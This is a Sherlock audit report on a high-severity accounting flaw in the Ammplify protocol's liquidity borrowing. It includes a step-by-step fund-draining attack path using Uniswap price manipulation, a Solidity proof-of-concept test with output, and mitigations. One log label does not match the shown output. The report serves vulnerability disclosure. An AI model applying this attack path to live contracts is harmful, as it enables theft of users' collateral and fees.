---
tags:
  - lang/solidity
  - sector/dex
  - sector/lending
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/data-corruption/price-manipulation
  - trigger/price-manipulation
protocol: "[[Ammplify]]"
auditors:
  - "[[anonymousjoe]]"
  - "[[blockace]]"
  - "[[panprog]]"
report: "https://github.com/sherlock-audit/2025-09-ammplify-judging"
genome:
  - "[[decimal-mismatch]]"
  - "[[fee-theft]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[trigger/price-manipulation]]"
  - "[[oracle-manipulation-resistance]]"
---
# H-9: Liquidity borrowed from or repaid to parent nodes is not always minted or burned in the uniswap pool, breaking up accounting and allowing to steal all protocol funds

- id: 63175
- impact: HIGH
- protocol: [[Ammplify]]
- reporter: anonymousjoe (Sherlock)
- source: N/A

## Summary


This bug report describes an issue in the Ammplify contract where liquidity is incorrectly borrowed from the parent node, causing incorrect accounting and portfolio of uniswap positions. This can lead to protocol insolvency and the ability for malicious users to steal all protocol funds. The root cause of the issue is that when liquidity is borrowed, it is borrowed for both the current node and its sibling, even if the sibling is not part of the settlement route. The impact of this bug includes incorrect portfolio of uniswap positions and the ability for attackers to steal all protocol funds. A proof of concept is provided and a possible solution is suggested, which involves using two passes in the pool settlement phase. 

## Details


Source: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/424 

## Found by 
anonymousjoe, blockace, panprog

### Summary

When there is not enough liquidity in the node, it borrows liquidity from the parent. Since parent's liquidity equals liquidity of both children, borrowing liquidity increases the liquidity both of the current node and its sibling. This is done in `solveLiq`:
```solidity
            // We need to borrow liquidity from our parent node.
            Node storage sibling = data.node(iter.key.sibling());
            Node storage parent = data.node(iter.key.parent());
            int128 borrow = -netLiq;
            if (borrow < int128(data.liq.compoundThreshold)) {
                // We borrow at least this amount.
                borrow = int128(data.liq.compoundThreshold);
            }
            parent.liq.preLend += borrow;
            parent.liq.dirty = true;
            node.liq.borrowed += uint128(borrow);
            node.liq.dirty = true;
            sibling.liq.preBorrow += borrow;
            sibling.liq.dirty = true;
```

Notice, that sibling's liquidity is not actually modified, only `preBorrow` changes, which doesn't influence `net()` liquidity calculation. Moreover, in many cases siblings are not included in the route, meaning that in the settle walker, where uniswap pool liquidity is minted/burned, these siblings are not traversed and so the corresponding uniswap liquidity is not minted/burned. This leads to incorrect accounting and incorrect portfolio of uniswap positions in the Ammplify contract: any price changes are calculated as if the contract holds corresponding positions, while contract doesn't actually hold them.

Moreover, this issue can be used by any malicious user to manipulate pool prices and steal all diamond funds (which includes all Takers collateral and collected fees not yet claimed or compounded).

To demonstrate the issue, here is the example of the route when modifying position in the [720..960] interval. These are the nodes visited by all walkers (when traveling up, as liquidity and settlement is done on the way up):
720..960
480..960
0..960
0..1920
0..3840
...

If the node [720..960] doesn't have enough liquidity, the liquidity is borrowed from the [480..960] node, and is given to 2 nodes: [480..720] and [720..960]. But since node [480..720] is not in the route, uniswap liquidity is not minted for it.

### Root Cause

When liquidity is borrowed, it's borrowed both for current node and its sibling, which might not be part of the settlement route:
https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L398-L399
https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L413-L414

### Internal Pre-conditions

Taker has taken some liquidity, where maker can reduce liquidity so that it borrows from parent

### External Pre-conditions

None.

### Attack Path

**Incorrect accounting and portfolio of uniswap liquidity positions, happens by itself**
Happens almost any time liquidity has to be borrowed. 
Example:
1. User has 100e18 maker liquidity in 480..960 range
2. Taker takes 100e18 liquidity in the 720..960 range
3. Since there is not enough liquidity available in the 720..960 range, it is borrowed from the 480..960 range
4. 100e18 of 480..960 liquidity is burned
5. 100e18 worth of 720..960 liquidity is given to taker

Notice, 480..720 liquidity is not minted. So the Ammplify now owes 100e18 liquidity in the 480..960 range, but has 0 uniswap positions, taker owes Ammplify 100e18 liquidity in the 720..960 range and Ammplify has current asset distribution from the 100e18 liquidity of the 480..720 range. Once liquidity is repaid back, Ammplify might be insolvent and unable to mint 480..960 liquidity to repay to the user, because it will have a different tokens distribution from the required one, and won't have fees which uniswap position earned.

**Stealing all funds**
Example:
1. Current price is 500
1. Attacker has 300e18 maker liquidity in the 720..960 range
2. Taker takes 100e18 of liquidity in the 720..960 range
3. Attacker adds 100e18 liquidity in the 480..960 range
4. Attacker adds 100e18 liquidity in the 480..720 range
5. Attacker removes 300e18 liquidity from the 720..960 range. This node borrows 100e18 liquidity from 480..960 node. Note, node 480..720 has still 100e18 uniswap liquidity after this operation, instead of 200e18
6. Attacker manipulates uniswap current price to 720
7. Attacker removes 100e18 liquidity from the 480..960 range. This gives attacker token1 in the value higher than at current price of 500 without minting or burning uniswap liquidity (Ammplify's node liquidity = 100e18(maker) + (preBorrow)100e18 - 100e18(maker removal) = 100e18, so not modified)
8. Attacker manipulates uniswap current price back to 500

This can be repeated many times with each loop bringing attacker profit (he mints 100e18 liquidity at current price of 500, then burns it at inflated price of 720). Eventually all Ammplify balance is stolen. Since it can be done multiple times in 1 transaction, this should require just a few transactions, if not just one (if taker liquidity is large enough).

### Impact

- Incorrect portfolio of uniswap positions which can lead to protocol insolvency due to unearned fees and incorrect tokens composition
- Attacker can steal all protocol funds (takers collateral and collected fees not yet claimed or compounded)

### Proof of concept

Add this test to `Taker.t.sol`:
```solidity
import { Key, KeyImpl } from "../../src/tree/Key.sol";
import { Node } from "../../src/walkers/Node.sol";
import { LiqNode } from "../../src/walkers/Liq.sol";
...
    function net(LiqNode memory self) internal returns (int128) {
        return int128(self.borrowed + self.mLiq) - int128(self.tLiq + self.lent);
    }

    function testBorrowIncorrect() public {
        bytes memory rftData = "";

        // Collateralize before creating taker position
        _collateralizeTaker(recipient, liquidity);

        // set some liquidity to avoid the other bugs causing reverts
        addPoolLiq(0, 480, 960, 1);
        addPoolLiq(0, 480, 720, 1);
        addPoolLiq(0, 720, 960, 1);

        // set price inside the range
        swapTo(0, TickMath.getSqrtRatioAtTick(840));

        // First create a maker large enough to borrow from.
        uint256 makerAssetId = makerFacet.newMaker(
            recipient,
            poolAddr,
            720,
            960,
            300e18,
            true,
            sqrtPriceLimitsX96[0],
            sqrtPriceLimitsX96[1],
            rftData
        );

        ticks[0] = 720;
        ticks[1] = 960;

        // taker takes some of the liquidity
        uint256 takerAssetId = takerFacet.newTaker(
            recipient,
            poolAddr,
            ticks,
            100e18,
            vaultIndices,
            sqrtPriceLimitsX96,
            79228162514264337593543950336, // tick 840
            rftData
        );

        // now attacker can manipulate a new large mint
        // provide liquidity in a much large range
        uint256 makerAssetId2 = makerFacet.newMaker(
            recipient,
            poolAddr,
            480,
            960,
            100e18,
            true,
            sqrtPriceLimitsX96[0],
            sqrtPriceLimitsX96[1],
            rftData
        );

        // check the liquidity in all ranges
        uint24 tree480 = poolInfo.treeTick(480);
        uint24 tree720 = poolInfo.treeTick(720);
        Key[] memory keys = new Key[](3);
        keys[0] = KeyImpl.make(tree480, 4); // 480..720 range
        keys[1] = KeyImpl.make(tree480, 8); // 480..960 range
        keys[2] = KeyImpl.make(tree720, 4); // 720..960 range
        Node[] memory nodes = viewFacet.getNodes(poolAddr, keys);
        console.log("480..720 liquidity = ", net(nodes[0].liq) / 1e18);
        console.log("480..960 liquidity = ", net(nodes[1].liq) / 1e18);
        console.log("720..960 liquidity = ", net(nodes[2].liq) / 1e18);

        // remove liquidity in the range where it was taken
        makerFacet.adjustMaker(recipient, makerAssetId, 1e18, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);

        nodes = viewFacet.getNodes(poolAddr, keys);
        console.log("after removing 199 in [720..960]:");
        console.log("480..720 liquidity = ", net(nodes[0].liq) / 1e18);
        console.log("480..960 liquidity = ", net(nodes[1].liq) / 1e18);
        console.log("720..960 liquidity = ", net(nodes[2].liq) / 1e18);
    }
```

Console output from running the test:

```solidity
  480..720 liquidity =  0
  480..960 liquidity =  100
  720..960 liquidity =  200
  after removing 299 in [720..960]:
  480..720 liquidity =  0
  480..960 liquidity =  1
  720..960 liquidity =  0
```

Note that after removing 299 liquidity in the 720..960 range there is just 1 liquidity remaining in 480..960 range and no liquidity in the 480..720 range.

### Mitigation

Possible solution is to use 2 passes in the pool settlement phase:
1. Same as now
2. Another pass on a modified route, which includes all siblings (so traverses always 2 sibling nodes at each width before going to parent). In this pass only apply preBorrow / preLend and mint/burn uniswap liquidity as needed.

This can actually be more complicated due to liquidity modified in the 2nd phase which can influence the other things. So possibly a more correct solution can include 2 passes in the liquidity modification phase and including both siblings in all routes.
